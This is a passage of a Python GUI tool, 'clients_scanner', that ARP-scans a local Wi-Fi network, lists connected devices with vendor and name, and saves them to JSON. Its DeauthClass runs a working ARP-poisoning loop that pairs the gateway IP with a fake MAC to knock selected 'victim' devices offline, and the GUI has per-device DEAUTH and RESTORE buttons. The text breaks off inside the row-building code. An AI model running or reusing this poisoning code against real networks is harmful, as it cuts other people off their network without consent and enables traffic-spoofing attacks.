"""clients_scanner
version: 0.1.2
date: 13.06.2022
author: streanger
"""
import sys
import os
import re
import json
import time
import datetime
import ctypes
import random
import subprocess
from pathlib import Path
from collections import defaultdict
from functools import partial
from threading import Thread
from tkinter import (
    Tk,
    Frame,
    Canvas,
    Scrollbar,
    Widget,
    Label,
    Entry,
    Button,
    StringVar,
    HORIZONTAL,
    VERTICAL,
    messagebox,
    font,
    YES,
    NO,
    TOP,
    BOTTOM,
    LEFT,
    RIGHT,
    BOTH,
    X,
    Y,
)

# from tkinter.ttk import Style, Scrollbar
from PIL import ImageTk, Image, ImageDraw, ImageOps
from scapy.all import ARP, Ether, srp, send
from mac_vendor_lookup import MacLookup
from termcolor import colored
import pkg_resources


def script_path():
    """set path to script path"""
    current_path = os.path.realpath(os.path.dirname(sys.argv[0]))
    os.chdir(current_path)
    return current_path


def timer(func):
    """function wrapper, for measure execution time"""

    def wrapper(*args, **kwargs):
        before = time.time()
        val = func(*args, **kwargs)
        after = time.time()
        print("func: {}, elapsed time: {}s".format(func.__name__, after - before))
        return val

    return wrapper


def static_file_path(directory, filename):
    """get path of the specified filename from specified directory"""
    resource_path = "/".join((directory, filename))  # Do not use os.path.join()
    try:
        template = pkg_resources.resource_filename(__name__, resource_path)
    except KeyError:
        return (
            "none"  # empty string cause AttributeError, and non empty FileNotFoundError
        )
    return template


def write_json(filename, data):
    """write to json file"""
    with open(filename, "w", encoding="utf-8") as f:
        # ensure_ascii -> False/True -> characters/u'type'
        json.dump(data, f, sort_keys=True, indent=4, ensure_ascii=False)
    return True


def read_json(filename):
    """read json file to dict"""
    data = {}
    try:
        with open(filename, encoding="utf-8") as f:
            data = json.load(f)
    except FileNotFoundError:
        print("[x] file not found: {}".format(filename))
    return data


def get_config_directory():
    """create config directory in users home
    https://stackoverflow.com/questions/11174769/python-save-files-to-user-folder-windows
    https://stackoverflow.com/questions/22947427/getting-home-directory-with-pathlib
    home_directory = os.path.expanduser("~")
    """
    home_directory = Path.home()
    config_directory = home_directory.joinpath("scanner")
    config_directory.mkdir(exist_ok=True)
    return config_directory


class VerticalScrolledFrame:
    """
    A vertically scrolled Frame that can be treated like any other Frame
    ie it needs a master and layout and it can be a master.
    :width:, :height:, :bg: are passed to the underlying Canvas
    :bg: and all other keyword arguments are passed to the inner Frame
    note that a widget layed out in this frame will have a self.master 3 layers deep,
    (outer Frame, Canvas, inner Frame) so
    if you subclass this there is no built in way for the children to access it.
    You need to provide the controller separately.
    https://gist.github.com/novel-yet-trivial/3eddfce704db3082e38c84664fc1fdf8
    (changed a little)
    """

    def __init__(self, master, **kwargs):
        width = kwargs.pop("width", None)
        height = kwargs.pop("height", None)
        bg = kwargs.pop("bg", kwargs.pop("background", None))
        self.outer = Frame(master, **kwargs)

        if True:
            self.vsb = Scrollbar(self.outer, orient=VERTICAL)
            self.vsb.pack(fill=Y, side=RIGHT, expand=NO)
        else:
            style = Style()
            style.configure("RW.TLabel", foreground="red", background="black")
            self.vsb = Scrollbar(
                self.outer, orient=VERTICAL, cursor="arrow", style="RW.TLabel"
            )
            self.vsb.pack(fill=Y, side=RIGHT, expand=NO)

        self.canvas = Canvas(
            self.outer, highlightthickness=0, width=width, height=height, bg=bg
        )
        self.canvas.pack(side=TOP, fill=BOTH, expand=YES)
        self.canvas["yscrollcommand"] = self.vsb.set
        # mouse scroll does not seem to work with just "bind"; You have
        # to use "bind_all". Therefore to use multiple windows you have
        # to bind_all in the current widget
        self.canvas.bind("<Enter>", self._bind_mouse)
        self.canvas.bind("<Leave>", self._unbind_mouse)
        self.canvas.addtag_all("all")  # (added) for configuring width
        self.vsb["command"] = self.canvas.yview
        self.inner = Frame(self.canvas, bg=bg)
        # pack the inner Frame into the Canvas with the topleft corner 4 pixels offset
        self.canvas.create_window(
            0, 0, window=self.inner, anchor="nw"
        )  # changed - starts from (0, 0)
        self.canvas.bind(
            "<Configure>", self._on_frame_configure
        )  # (changed) canvas bind instead of inner
        self.outer_attr = set(dir(Widget))

    def __getattr__(self, item):
        if item in self.outer_attr:
            # geometry attributes etc (eg pack, destroy, tkraise) are passed on to self.outer
            return getattr(self.outer, item)
        else:
            # all other attributes (_w, children, etc) are passed to self.inner
            return getattr(self.inner, item)

    def _on_frame_configure(self, event=None):
        x1, y1, x2, y2 = self.canvas.bbox("all")
        height = self.canvas.winfo_height()
        width = self.canvas.winfo_width()  # (added) to resize inner frame
        self.canvas.config(scrollregion=(0, 0, x2, max(y2, height)))
        self.canvas.itemconfigure("all", width=width)  # (added) to resize inner frame

    def _bind_mouse(self, event=None):
        self.canvas.bind_all("<4>", self._on_mousewheel)
        self.canvas.bind_all("<5>", self._on_mousewheel)
        self.canvas.bind_all("<MouseWheel>", self._on_mousewheel)

    def _unbind_mouse(self, event=None):
        self.canvas.unbind_all("<4>")
        self.canvas.unbind_all("<5>")
        self.canvas.unbind_all("<MouseWheel>")

    def _on_mousewheel(self, event):
        """Linux uses event.num; Windows / Mac uses event.delta"""
        if event.num == 4 or event.delta > 0:
            self.canvas.yview_scroll(-1, "units")
        elif event.num == 5 or event.delta < 0:
            self.canvas.yview_scroll(1, "units")

    def __str__(self):
        return str(self.outer)


class ScannerClass:
    """class accepts cooperates with matcher and deauthenticator objects
    https://www.juniper.net/documentation/en_US/junos-space-apps/network-director3.7/topics/concept/wireless-ssid-bssid-essid.html
    console color - magenta
    """

    def __init__(self, matcher=None, deauthenticator=None, debug=False, timeout=5):
        self.debug = debug
        self.color = "magenta"
        print(colored("[*] scanner", self.color))
        self.matcher = matcher
        self.deauthenticator = deauthenticator
        self.timeout = timeout

        # network info
        self.ssid = ""
        self.bssid = ""
        self.gateway_ip = ""
        self.gateway_mac = ""
        self.target_ip = ""

        # thread
        self.scanner_thread = None
        self.hold_thread = False
        self.join_thread = False

    def run(self):
        """run scanner"""
        if not self.matcher:
            print(colored("[x] matcher is not specified", self.color))
            return False

        if not self.scanner_init():
            return False

        self.scanner_thread = Thread(target=self.devices_scanner)
        self.scanner_thread.start()
        return True

    def join_thread_method(self):
        """join thread from external object"""
        self.join_thread = True
        try:
            self.scanner_thread.join()
        except AttributeError:
            pass
        return None

    def scanner_init(self):
        """get network bssid, essid, gateway (ip, mac)
        BSSID - AP MAC address
        SSID - name of network
        possible error:
            [*] SSID: off/any
            [*] BSSID: not-associated
        """
        ssid_error = "off/any"
        bssid_error = "not-associated"

        self.ssid, self.bssid = self.get_ssid_bssid()
        if not all((self.ssid, self.bssid)):
            print(colored("[x] can't find network (SSID, BSSID)", self.color))
            return False

        if (self.ssid == ssid_error) or (self.bssid == bssid_error):
            print(colored("[x] errors:", self.color))
            print(colored("    SSID: {}".format(self.ssid), self.color))
            print(colored("    BSSID: {}".format(self.bssid), self.color))
            return False

        print(colored("[*] SSID: {}".format(self.ssid), self.color))
        print(colored("[*] BSSID: {}".format(self.bssid), self.color))

        # pass ssid, bssid info to matcher
        self.matcher.pass_ssid_bssid(self.ssid, self.bssid)

        self.gateway_ip, self.gateway_mac = self.get_gateway(self.bssid)
        if not all((self.gateway_ip, self.gateway_mac)):
            print(colored("[x] can't find gateway IP and/or MAC", self.color))
            print(
                colored("[x] gateway_ip: {}".format(repr(self.gateway_ip)), self.color)
            )
            print(
                colored(
                    "[x] gateway_mac: {}".format(repr(self.gateway_mac)), self.color
                )
            )
            return False

        # pass gateway ip to deauthenticator
        self.deauthenticator.pass_gateway_ip_mac(self.gateway_ip, self.gateway_mac)

        self.target_ip = "{}/24".format(self.gateway_ip)
        print(colored("[*] gateway IP: {}".format(self.gateway_ip), self.color))
        print(colored("[*] gateway MAC: {}".format(self.gateway_mac), self.color))
        print(colored("[*] target network: {}".format(self.target_ip), self.color))
        print()
        return True

    def devices_scanner(self):
        """function for continous searching for new devices in thread"""
        random_devices = [
            ("aa:bb:cc:dd:ee:ff", "1.2.3.4"),
            ("bb:cc:dd:ee:ff:aa", "2.3.4.5"),
            ("cc:dd:ee:ff:aa:bb", "3.4.5.6"),
            ("cc:cc:ee:ff:aa:cc", "33.44.55.66"),
            ("ee:ee:ee:ff:aa:bb", "13.14.15.16"),
            ("ff:ff:ee:ff:aa:ff", "23.24.25.26"),
            ("af:ff:ee:ff:aa:ff", "123.124.25.26"),
            ("ae:ff:ee:ff:aa:ff", "123.124.125.126"),
            ("ad:af:ee:ff:aa:ff", "3.124.5.126"),
            ("ac:af:ee:ff:aa:ff", "33.44.55.116"),
            ("ab:af:fe:ff:aa:ff", "11.44.22.33"),
            ("aa:af:de:ff:aa:ff", "22.11.22.44"),
        ]

        while True:
            if self.hold_thread:
                if self.join_thread:
                    return False
                time.sleep(0.01)
                continue

            if self.join_thread:
                return False

            if self.debug:
                # DEBUG
                clients = [
                    random.choice(random_devices) for x in range(random.randint(1, 2))
                ]
                clients = dict(list(set(clients)))
                time.sleep(6)
            else:
                clients = self.get_clients(self.target_ip, self.timeout, iterations=1)

            if (not self.join_thread) and (not self.hold_thread):
                self.matcher.pass_data(clients)  # send devices info to the next object
        return None

    @staticmethod
    def get_gateway(bssid=""):
        """get gateway_ip and gateway_mac
        wrong response from arp command (arp -n | grep wlan0 | head -n 1):
            8.8.4.4                          (incomplete)                              wlan0
        positive response:
            192.168.43.1             ether   60:ab:67:e9:78:60   C                     wlan0
        """
        if os.name == "nt":
            command = "arp -a"
            cmd_output = subprocess.Popen(
                command,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                encoding="cp852",
                universal_newlines=True,
            )

            response = cmd_output.stdout.read()
            response_lines = [line for line in response.splitlines() if line.strip()]

            if not bssid:
                # it will fail, if connect any device over ethernet
                gateway_mac = re.search(
                    r"([0-9a-f]{2}[:-]){5}([0-9a-f]{2})", response, re.I
                ).group()
                gateway_ip = [
                    line.split()[0]
                    for line in response_lines
                    if gateway_mac in line.split()
                ][0]
                gateway_mac = gateway_mac.replace("-", ":")

            else:
                bssid_minus = bssid.replace(":", "-")
                bssid_minus_half = "-".join(bssid_minus.split("-")[:3])
                gateway_ip_lines = [
                    line.split()[0]
                    for line in response_lines
                    if line.split()[1].startswith(bssid_minus_half)
                ]
                gateway_ip = gateway_ip_lines[0]
                gateway_mac = bssid

        else:
            # get gateway IP
            command = "ip route"  # route -n
            response = subprocess.getoutput(command)
            gateway_ip = response.splitlines()[0].split()[2]

            # get gateway mac
            command = "arp -n | grep wlan0"
            response = subprocess.getoutput(command)
            if not response.strip():
                print(
                    colored(
                        "[!] error, can't find network ({})".format(command), "yellow"
                    )
                )
                return "", ""

            lines = [
                line for line in response.splitlines() if gateway_ip in line.split()[0]
            ]
            try:
                _, _, gateway_mac = lines[0].split()[:3]
            except IndexError:
                return "", ""

        return gateway_ip, gateway_mac

    @staticmethod
    def get_ssid_bssid():
        """get ssid(network name) and bssid(gateway mac)"""
        os_name = os.name
        if os_name == "nt":
            command = "Netsh WLAN show interfaces"
            cmd_output = subprocess.Popen(
                command,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                encoding="cp852",
                universal_newlines=True,
            )
            response = cmd_output.stdout.readlines()
            ssid_line = [line for line in response if "SSID" in line.split()]
            bssid_line = [line for line in response if "BSSID" in line.split()]
            ssid = ""
            if ssid_line:
                ssid = (ssid_line[0].split(":", 1)[1]).strip()
            bssid = ""
            if bssid_line:
                bssid = (bssid_line[0].split(":", 1)[1]).strip()
        else:
            command = "iwgetid"
            command = "iwconfig"
            response = subprocess.getoutput(command).splitlines()
            essid_line = [line for line in response if "ESSID:" in line]
            bssid_line = [line for line in response if "Access Point:" in line]
            ssid = ""
            if essid_line:
                ssid = (essid_line[0].split("ESSID:", 1)[1]).strip().replace('"', "")
            bssid = ""
            if bssid_line:
                bssid = (bssid_line[0].split("Access Point:", 1)[1]).strip().lower()
        return (ssid, bssid)

    @staticmethod
    def get_clients(target_ip, timeout, iterations=1):
        """get all clients in local network; return list of (ip, mac)"""
        arp = ARP(pdst=target_ip)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether / arp
        clients = []
        for _ in range(iterations):
            try:
                result = srp(packet, timeout=timeout, verbose=0)[0]

            except OSError:
                print("[x] OSError catched, while searching for clients...")
                time.sleep(2)
                break

            clients.extend(
                [(received.psrc, received.hwsrc.lower()) for (sent, received) in result]
            )

        clients = {mac: ip for ip, mac in list(set(clients))}
        # time.sleep(1)  # is it needed?
        return clients


class DevicesMatcher:
    """
    info about class
    match devices; send data to gui; store data in files (jsons)
    -receive data from ScannerClass object
    -send performed data to gui
    -send new data to json

    console color - green
    """

    def __init__(self, gui_object=None):
        self.gui_object = (
            gui_object  # gui object to send data to print, and receive data from
        )
        self.color = "green"
        print(colored("[*] matcher", self.color))
        self.ssid = ""
        self.bssid = ""
        self.clients_file = "clients.json"
        self.config_directory = get_config_directory()
        self.clients_file = self.config_directory.joinpath(self.clients_file)
        self.clients_all = read_json(self.clients_file)
        self.last_seen_timeout = 20  # [s]

        names = {mac: item["name"] for mac, item in self.clients_all.items()}
        self.names_container = defaultdict(lambda: "unknown")
        self.names_container.update(names)
        self.names_container_copy = self.names_container.copy()

    def pass_ssid_bssid(self, ssid, bssid):
        """receive ssid, bssid data from scanner"""
        self.ssid = ssid
        self.bssid = bssid
        print(colored("[*] SSID received: {}".format(self.ssid), self.color))
        print(colored("[*] BSSID received: {}".format(self.bssid), self.color))

        if not self.gui_object:
            print(colored("[x] gui_object not defined", self.color))
            return False

        # send info about ssid, bssid
        self.gui_object.pass_ssid_bssid(ssid, bssid)

        # send info to gui about bssid related clients
        table = self.json_to_table()
        table = sorted(
            table, key=lambda x: int(x[2].split(".")[-1])
        )  # sort only at init
        self.gui_object.pass_print_table(table)
        return True

    def json_to_table(self):
        """convert json data about clients, to table possible for print by gui"""
        table = []
        for _, value in self.clients_all.items():
            client_bssid = value["bssid"]
            if not client_bssid == self.bssid:
                # ~ print(colored('[*] device from different network: ({})'.format(client_bssid), 'red'))
                continue
            last_seen = self.timestamp_to_datetime(value["last_seen"])
            now = datetime.datetime.now()
            time_diff_seconds = (now - last_seen).total_seconds()
            visible = bool(time_diff_seconds < self.last_seen_timeout)
            gui_row = (
                value["name"],
                value["vendor"],
                value["ip"],
                value["mac"],
                visible,
            )
            table.append(gui_row)
        return table

    @staticmethod
    def get_vendor(mac):
        """get vendor for specified mac"""
        try:
            mac_lookup_info = MacLookup().lookup(mac)
        except KeyError:
            mac_lookup_info = "device not recognized"
        return mac_lookup_info

    def remove_client(self, mac):
        """remove client from dict, by specified mac
        check where does the errors come from; for now false
        """
        item = self.clients_all.pop(mac, False)
        self.names_container.pop(mac, False)
        self.names_container_copy.pop(mac, False)
        print(
            colored(
                "[!] client removed permanently: ({}, {})".format(mac, item["name"]),
                self.color,
            )
        )
        return None

    def pass_data(self, devices):
        """receive devices data from scanner
        fix naming stuff; for now its passed by dict and updated for all
        """
        # for debug
        devices_str = "\n".join(["    {}".format(item) for item in devices.items()])
        print(colored("[*] devices found:\n{}\n".format(devices_str), self.color))

        # ******* update clients all data *******
        for (mac, ip) in devices.items():
            item = {}
            item["name"] = self.names_container_copy.get(mac, "unknown")
            item["ip"] = ip
            item["mac"] = mac
            item["vendor"] = self.get_vendor(mac)
            item["last_seen"] = self.timestamp()
            item["ssid"] = self.ssid
            item["bssid"] = self.bssid

            self.clients_all[mac] = item

        # ******* update all names *******
        for mac, name in self.names_container_copy.items():
            self.clients_all[mac]["name"] = name

        # write to json
        write_json(self.clients_file, self.clients_all)
        print(colored("[*] json updated", self.color))

        if not self.gui_object:
            print(colored("[x] gui_object not defined", self.color))
            return False

        # create table and send to gui
        table = self.json_to_table()
        self.gui_object.pass_print_table(table)
        return None

    def name_update(self, pair):
        """pass {key:value} pair, where key - mac address, value - name of client
        update immediately or just update container and update will occur in next scan
        """
        print(colored("[*] name updated: {}".format(pair), self.color))
        self.names_container.update(pair)
        self.names_container_copy = self.names_container.copy()
        return None

    @staticmethod
    def timestamp():
        """generate timestamp in string format"""
        out = str(datetime.datetime.now())
        return out

    @staticmethod
    def timestamp_to_datetime(str_timestamp):
        """convert string timestamp to datetime type"""
        return datetime.datetime.strptime(str_timestamp, "%Y-%m-%d %H:%M:%S.%f")


class DeauthClass:
    """deauthenticator class"""

    def __init__(self, debug=False):
        self.debug = debug
        self.color = "yellow"
        print(colored("[*] deauthenticator", self.color))
        self.hold_thread = False
        self.join_thread = False
        self.deauth_thread = None

        # data
        self.deauth_wait_between_packets = 0.1
        self.fake_mac = "aa:bb:cc:dd:ee:ff"  # for now; use random macs
        self.gateway_ip = ""
        self.gateway_mac = ""
        self.clients_deauth_dict = {}
        """
        # dict format
            'aa:aa:aa:bb:bb:bb': True,      # deauth (poison) in loop
            'aa:aa:aa:cc:cc:cc': False,     # restore in first possible iteration
        """

        self.deauth_thread = Thread(target=self.deauth_loop)
        self.deauth_thread.start()

    def pass_gateway_ip_mac(self, gateway_ip, gateway_mac):
        """pass from external source"""
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac
        print(
            colored(
                "[*] gateway IP/mac set to: {}/{}".format(
                    self.gateway_ip, self.gateway_mac
                ),
                self.color,
            )
        )
        return None

    def switch_client(self, victim_mac, victim_ip, deauth):
        """deauth or restore client depend on deauth parameter value"""
        # ~ if victim_mac in self.clients_deauth_dict:
        if not deauth:
            self.clients_deauth_dict[victim_mac] = {
                "victim_ip": victim_ip,
                "deauth_flag": False,
            }
            print(
                colored(
                    "[*] deauth -> ({}, {}): {}".format(victim_mac, victim_ip, False),
                    self.color,
                )
            )
            return None
        self.clients_deauth_dict[victim_mac] = {
            "victim_ip": victim_ip,
            "deauth_flag": True,
        }
        print(
            colored(
                "[*] deauth -> ({}, {}): {}".format(victim_mac, victim_ip, True),
                self.color,
            )
        )
        return None

    def join_thread_method(self):
        """join thread from external object"""
        self.join_thread = True
        self.deauth_thread.join()
        return None

    def deauth_loop(self):
        """deauth clients specified in clients_deauth_dict"""
        while True:
            if self.hold_thread:
                if self.join_thread:
                    return False
                time.sleep(0.01)
                continue

            if self.join_thread:
                return False

            if not self.clients_deauth_dict:
                time.sleep(0.1)
                continue

            # copy, to prevent changes in dict, while iterating
            clients_dict_copy = self.clients_deauth_dict.copy()

            for (victim_mac, info) in clients_dict_copy.items():
                victim_ip = info["victim_ip"]
                deauth_flag = info["deauth_flag"]

                if deauth_flag:
                    if not self.debug:
                        self.poison(
                            victim_ip, victim_mac, self.gateway_ip, self.fake_mac
                        )
                    print(
                        colored(
                            "[*] poisoning victim: ({}, {})".format(
                                victim_mac, victim_ip
                            ),
                            self.color,
                        )
                    )

                else:
                    if not self.debug:
                        self.restore(
                            victim_ip, victim_mac, self.gateway_ip, self.gateway_mac
                        )
                    print(
                        colored(
                            "[*] restoring victim: ({}, {})".format(
                                victim_mac, victim_ip
                            ),
                            self.color,
                        )
                    )

                    # remove client from dictionary, to not send restore every time
                    self.clients_deauth_dict.pop(victim_mac)

            time.sleep(self.deauth_wait_between_packets)
        return None

    @staticmethod
    def poison(victim_ip, victim_mac, gateway_ip, fake_mac):
        """Send the victim an ARP packet pairing the gateway ip with the wrong mac address"""
        try:
            packet = ARP(
                op=2, psrc=gateway_ip, hwsrc=fake_mac, pdst=victim_ip, hwdst=victim_mac
            )
            send(packet, verbose=0)
        except OSError as err:
            print("error catched: {}".format(err))
        return None

    @staticmethod
    def restore(victim_ip, victim_mac, gateway_ip, gateway_mac):
        """Send the victim an ARP packet pairing the gateway ip with the correct mac address"""
        try:
            packet = ARP(
                op=2,
                psrc=gateway_ip,
                hwsrc=gateway_mac,
                pdst=victim_ip,
                hwdst=victim_mac,
            )
            send(packet, verbose=0)
        except OSError as err:
            print("error catched: {}".format(err))
        return None


class GuiClass(Frame):
    """gui application for showing local network guests; allows for deauth"""

    def __init__(self, master):
        super().__init__(master)

        # *********** objects ***********
        self.matcher = None
        self.deauthenticator = None
        self.scanner = None
        self.hold_thread = False
        self.join_thread = False
        self.after_id = None  # id to be used when closing window
        self.color = "cyan"
        print(colored("[*] gui", self.color))

        # *********** json config ***********
        self.bssid = ""
        self.bssid_format = "[ BSSID ]\n{}"
        self.ssid = ""
        self.ssid_format = "[ SSID ]\n{}"

        self.rows_widgets = {}  # widgets reference
        self.top_widgets = {}  # ssid, bssid, buttons, label
        self.entries = {}  # entries reference
        self.clients_names = {}
        self.mac_ip_matching = {}
        self.deauth_status = {}  # mac - status reference

        self.config_file = "config.json"
        self.config_directory = get_config_directory()
        self.config_file = self.config_directory.joinpath(self.config_file)
        self.config = read_json(self.config_file)
        if not self.config:
            self.config = {
                "night": False,
                "sound": True,
                "width": 750,
                "height": 600,
            }

        if self.config["sound"]:
            self.sound_mode_image = "sound_on"
        else:
            self.sound_mode_image = "sound_off"

        self.original_color = self.master.cget("background")
        # self.original_color = "SystemButtonFace"
        self.set_night_mode_attributes()
        self.positive_color = "green"
        self.negative_color = "grey"
        self.active_text = " ACTIVE "
        self.inactive_text = "INACTIVE"

        self.deauth_button_deauth_text = " DEAUTH"
        self.deauth_button_restore_text = "RESTORE"
        self.deauth_positive_color = self.positive_color
        self.deauth_negative_color = self.negative_color

        self.initial_width = self.config["width"]
        self.initial_height = self.config["height"]

        self.draw_horizontal_lines = False
        # ~ self.draw_horizontal_lines = True

        # *********** app gui, consts, variables ***********
        # raised, sunken, flat, ridge, solid, groove
        self.relief = "groove"
        self.entry_relief = "sunken"
        if os.name == "nt":
            # self.app_font = "Lucida console"
            # self.app_font = "MS Gothic"
            self.app_font = "Source Code Pro Medium"
        else:
            self.app_font = "DejaVu Sans Mono"

        self.mono_small = font.Font(family=self.app_font, size=8, weight="normal")
        self.mono_medium = font.Font(family=self.app_font, size=8, weight="normal")
        self.mono_big = font.Font(family=self.app_font, size=11, weight="normal")
        self.mono_large = font.Font(family=self.app_font, size=12, weight="normal")

        # *********** create gui# ***********
        self.table = []  # table with rows to draw
        self.run_gui()
        self.update_rows_after()

    def pass_ssid_bssid(self, ssid, bssid):
        """pass data from scanner to gui"""
        self.ssid = ssid
        self.bssid = bssid

        ssid_widget = self.top_widgets.get("ssid", None)
        ssid_widget.config(text=self.ssid_format.format(self.ssid))
        print(colored("[*] ssid updated: {}".format(self.ssid), self.color))

        bssid_widget = self.top_widgets.get("bssid", None)
        bssid_widget.config(text=self.bssid_format.format(self.bssid))
        print(colored("[*] bssid updated: {}".format(self.bssid), self.color))
        return None

    def update_rows_after(self):
        """update rows using table, with after method"""
        after_timeout = 500  # [ms]
        # after_timeout = 10 # [ms]

        if self.hold_thread:
            self.after_id = self.master.after(after_timeout, self.update_rows_after)
            return None

        table = self.table.copy()  # is it needed?

        # ****** create or update gui rows ******
        self.gui_rows(table)

        # ****** call yourself ******
        self.after_id = self.master.after(after_timeout, self.update_rows_after)
        return None

    def run_gui(self):
        """create widgets; use after specifing matcher and deauthenticator objects
        consider:
            self.master.geometry("{}x{}+333+50".format(self.initial_width, self.initial_height))
        """
        # *********** init gui ***********
        # self.hide_console()
        self.master.protocol("WM_DELETE_WINDOW", self.on_closing)
        self.master.minsize(750, 100)  # width, height (minimal values for window)
        self.master.geometry("{}x{}".format(self.initial_width, self.initial_height))
        self.master.configure(background=self.widgets_bg_color)
        self.master.resizable(width=True, height=True)
        self.master.wm_title("scanner")
        self.pack()

        # *********** widgets ***********
        self.gui_shape()

        # *********** lift, get focus ***********
        self.master.attributes("-topmost", True)  # always on top
        self.master.update()
        self.master.attributes("-topmost", False)
        self.master.lift()  # move window to the top
        self.master.focus_force()
        return None

    def gui_shape(self):
        """run first time to create gui window with topbar; for now ssid and bssid are fixed"""
        # ************** define topbar frames **************
        topbar = Frame(self.master, relief=self.relief)
        topbar.pack(expand=NO, fill=BOTH, side=TOP, ipady=4)

        # use wrapper
        vertical_scrolled_frame = VerticalScrolledFrame(
            self.master, relief=self.relief, bg=self.widgets_bg_color
        )
        vertical_scrolled_frame.pack(expand=YES, fill=BOTH, side=TOP)

        # ************** frame for rows (common -> self) **************
        # ~ self.rows_frame = Frame(self.master, relief=self.relief)    # just in case of problems with scrollbar
        self.rows_frame = Frame(vertical_scrolled_frame, relief=self.relief)
        self.rows_frame.pack(expand=YES, fill=BOTH, side=TOP)

        # ************** footer **************
        footer = Frame(self.master, relief=self.relief)
        footer.pack(expand=NO, fill=BOTH, side=BOTTOM)
        footer_label = Label(
            footer,
            relief=self.relief,
            font=self.mono_big,
            text="pip install clients-scanner",
            bg=self.widgets_bg_color,
            fg=self.widgets_fg_color,
        )
        footer_label.pack(expand=YES, fill=BOTH, side=TOP)

        # ************** ssid, bssid **************
        top_ssid = Label(
            topbar,
            relief=self.relief,
            font=self.mono_big,
            text=self.ssid_format.format(self.ssid),
            bg=self.widgets_bg_color,
            fg=self.widgets_fg_color,
        )
        top_ssid.pack(expand=YES, fill=BOTH, side=LEFT)
        top_bssid = Label(
            topbar,
            relief=self.relief,
            font=self.mono_big,
            text=self.bssid_format.format(self.bssid),
            bg=self.widgets_bg_color,
            fg=self.widgets_fg_color,
        )
        top_bssid.pack(expand=YES, fill=BOTH, side=LEFT)
        self.top_widgets = {
            "ssid": top_ssid,
            "bssid": top_bssid,
        }

        # ************** night_mode *************
        img = self.get_proper_image(self.night_mode_image)
        top_night_mode_button = Button(
            topbar,
            font=self.mono_big,
            image=img,
            command=self.switch_night_mode,
            bg=self.widgets_bg_color,
            fg=self.widgets_fg_color,
        )
        top_night_mode_button.image = img
        top_night_mode_button.pack(expand=YES, fill=BOTH, side=LEFT)

        # ************* sound_mode **************
        img = self.get_proper_image(self.sound_mode_image)
        top_sound_mode_button = Button(
            topbar,
            font=self.mono_big,
            image=img,
            command=self.switch_sound_mode,
            bg=self.widgets_bg_color,
            fg=self.widgets_fg_color,
        )
        top_sound_mode_button.image = img
        top_sound_mode_button.pack(expand=YES, fill=BOTH, side=LEFT)

        # ************* 3rd button **************
        # if needed

        # ************* 4th button **************
        # if needed

        # ************** label **************
        top_right_label = Label(
            topbar,
            relief=self.relief,
            font=self.mono_large,
            text="the very scanner",
            bg=self.widgets_bg_color,
            fg=self.widgets_fg_color,
        )
        top_right_label.pack(expand=YES, fill=BOTH, side=LEFT)

        # ************** widgets reference **************
        self.top_widgets = {
            "ssid": top_ssid,
            "bssid": top_bssid,
            "night_mode": top_night_mode_button,
            "sound_mode": top_sound_mode_button,
            "right_label": top_right_label,
            "footer_label": footer_label,
            "vertical_scrolled_frame": vertical_scrolled_frame,
        }
        return None

    def gui_rows(self, rows):
        """create or update if exists
        name, vendor, ip, mac, visible = row
        """
        for index, row in enumerate(rows):
            _, _, _, mac, _ = row
            if mac in self.rows_widgets:
                # already exist, just update
                self.update_row(row)
                # pass
            else:
                # create new row at the bottom
                self.create_row(row)
                if self.config["sound"]:
                    # add sound bell here
                    print(colored("[+] new device (sound here)", self.color))
        return None

    def color_by_status(self, status):
        """return visible color depend on status"""
        if status:
            return self.positive_color
        return self.negative_color

    def active_text_by_status(self, status):
        """return visible color depend on status"""
        if status:
            return self.active_text
        return self.inactive_text

    def create_row(self, table_row):
        """create new single row
        pass index for colorizing rows
        name, vendor, ip, mac, visible = row
        """

        name, vendor, ip, mac, visible = table_row
        visible_color = self.color_by_status(visible)
        visible_text = self.active_text_by_status(visible)
        self.deauth_status[mac] = False

        # ************** main rows **************
        row_wrapper = Frame(self.rows_frame, relief=self.relief)
        row_wrapper.pack(expand=NO, fill=BOTH, side=TOP)
        row = Frame(row_wrapper, relief=self.relief)
        row.pack(expand=YES, fill=BOTH, side=TOP, ipady=4)
        if self.draw_horizontal_lines:
            horizontal_line = Frame(
                row_wrapper, relief=self.relief, bg="white"
            )  # black/blue/grey/white
            horizontal_line.pack(expand=YES, fill=X, side=TOP, ipady=1)

            # ~ long_label = Label(horizontal_line,relief=self.relief, font=self.mono_medium, text='----'*40, bg=self.widgets_bg_color, fg=self.widgets_fg_color,)
            # ~ long_label.pack(expand=YES, fill=X, side=TOP)

        # remove button (for removing ghost clients)
        remove_client_button = Button(
            row,
            font=self.mono_large,
            text="[X]",
            command=lambda q=mac: self.remove_client(q),
            bg=self.widgets_bg_color,
            fg=self.widgets_fg_color,
            justify="center",
        )
        remove_client_button.pack(expand=NO, fill=BOTH, side=LEFT)

        img = self.get_proper_image(name)
        image_label = Label(
            row, relief=self.relief, image=img, bg=self.widgets_bg_color
        )
        image_label.image = img  # remember to keep a reference
        image_label.name = name  # name for something
        image_label.pack(expand=NO, fill=BOTH, side=LEFT, ipadx=10)

        # Label -> Entry widget
        str_var = StringVar()
        client_name_entry = Entry(
            row,
            relief=self.entry_relief,
            font=self.mono_big,
            textvariable=str_var,
            bg=self.widgets_bg_color,
            fg=self.widgets_fg_color,
            justify="center",
        )
        client_name_entry.insert(0, name)
        client_name_entry.bind("<Return>", partial(self.entry_callback, mac))
        client_name_entry.pack(expand=YES, fill=BOTH, side=LEFT)
        self.entries[mac] = client_name_entry

        # Frame (3 labels -> device, ip, mac)
        info_frame = Frame(row, relief=self.relief)
        # info_frame.pack(expand=YES, fill=BOTH, side=LEFT)
        info_frame.pack(expand=YES, fill=BOTH, side=LEFT)

        # device
        info_frame_device = Label(
            info_frame,
            relief=self.relief,
            wraplength=200,
            font=self.mono_medium,
            text=vendor,
            bg=self.widgets_bg_color,
            fg=self.widgets_fg_color,
        )
        info_frame_device.pack(expand=YES, fill=BOTH, side=TOP)

        # ip & mac frame
        info_frame_bottom = Frame(info_frame, relief=self.relief)
        info_frame_bottom.pack(expand=YES, fill=BOTH, side=BOTTOM)

        # ip
        info_frame_ip = Label(
            info_frame_bottom,
            relief=self.relief,
            font=self.mono_medium,
            text=ip.center(15),
            bg=self.widgets_bg_color,
            fg=self.widgets_fg_color,
        )
